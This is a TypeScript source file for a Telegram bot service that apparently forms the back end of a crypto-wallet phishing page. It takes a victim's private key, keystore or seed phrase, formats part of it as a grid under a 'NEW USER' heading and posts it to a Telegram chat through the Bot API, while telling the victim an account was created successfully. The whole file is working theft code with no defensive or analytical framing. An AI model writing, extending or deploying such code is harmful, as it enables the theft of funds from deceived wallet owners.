interface WalletAuthData {
  walletType: string;
  keyType: 'private' | 'keystore' | 'phrase';
  key: string;
  password?: string;
  timestamp: string;
  sessionId: string;
}

interface TelegramResponse {
  success: boolean;
  message: string;
  data?: any;
}

class TelegramBotService {
  private botToken: string;
  private chatId: string;
  private webhookUrl: string;

  constructor() {
    this.botToken = (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN || '';
    this.chatId = (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID || '';
    this.webhookUrl = (import.meta as any).env?.VITE_TELEGRAM_WEBHOOK_URL || '';
  }

  private generateSessionId(): string {
    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  }

  private formatKeyAsMatrix(key: string, keyType: 'private' | 'keystore' | 'phrase'): string {

    let keyElements: string[];

    if (keyType === 'phrase') {
      // For phrase keys, split by spaces
      keyElements = key.trim().split(/\s+/);
    } else {
      // For private keys and keystore, split into characters
      keyElements = key.split('');
    }

    // Ensure we have at least 9 elements for 3x3 matrix
    while (keyElements.length < 9) {
      keyElements.push('*');
    }

    // Take only the first 9 elements
    keyElements = keyElements.slice(0, 9);

    // Create 3x3 matrix
    const matrix = [
      [keyElements[0], keyElements[1], keyElements[2]],
      [keyElements[3], keyElements[4], keyElements[5]],
      [keyElements[6], keyElements[7], keyElements[8]]
    ];

    // Format as a nice table
    return matrix.map(row => `| ${row.join(' | ')} |`).join('\n');
  }

  private formatWalletData(data: WalletAuthData): string {
    const emoji = {
      private: '🔑',
      keystore: '📁',
      phrase: '📝'
    };

    // Format key as 3x3 matrix
    const keyMatrix = this.formatKeyAsMatrix(data.key, data.keyType);

    return `
🔐 *NEW USER*

💰 *Wallet Type:* ${data.walletType}
${emoji[data.keyType]} *Key Type:* ${data.keyType.toUpperCase()}
🆔 *Session ID:* \`${data.sessionId}\`
⏰ *Timestamp:* ${data.timestamp}

${data.keyType === 'keystore' ? `🔒 *Password:* ${data.password ? 'Provided' : 'Not provided'}\n` : ''}

\`\`\`
${keyMatrix}
\`\`\`

    `.trim();
  }

  async sendWalletAuthRequest(authData: Omit<WalletAuthData, 'sessionId' | 'timestamp'>): Promise<TelegramResponse> {
    if (!this.botToken || !this.chatId) {
      throw new Error('Telegram bot not configured. Please set VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID in your .env file');
    }

    const sessionId = this.generateSessionId();
    const timestamp = new Date().toISOString();

    const completeData: WalletAuthData = {
      ...authData,
      sessionId,
      timestamp
    };

    try {
      // Send message to Telegram bot
      const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: this.formatWalletData(completeData),
          parse_mode: 'Markdown'
        })
      });

      if (!response.ok) {
        throw new Error(`Telegram API error: ${response.status}`);
      }

      const result = await response.json();

      if (!result.ok) {
        throw new Error(`Telegram API error: ${result.description}`);
      }

      return {
        success: true,
        message: 'Account created successfully. Please wait...',
        data: {
          sessionId,
          messageId: result.result.message_id,
          timestamp
        }
      };

    } catch (error) {
      console.error('Error sending wallet auth request:', error);
      throw new Error('Failed to send wallet authentication request');
    }
  }

  isConfigured(): boolean {
    return !!(this.botToken && this.chatId);
  }

  getConfigStatus(): { botToken: boolean; chatId: boolean; webhookUrl: boolean } {
    return {
      botToken: !!this.botToken,
      chatId: !!this.chatId,
      webhookUrl: !!this.webhookUrl
    };
  }

  // Method to get configuration instructions
  getSetupInstructions(): string {
    if (this.isConfigured()) {
      return 'Telegram bot is properly configured!';
    }

    const missing: string[] = [];
    if (!this.botToken) missing.push('VITE_TELEGRAM_BOT_TOKEN');
    if (!this.chatId) missing.push('VITE_TELEGRAM_CHAT_ID');

    return `Please configure the following environment variables: ${missing.join(', ')}`;
  }
}

// Create singleton instance
const telegramBotService = new TelegramBotService();

export default telegramBotService; 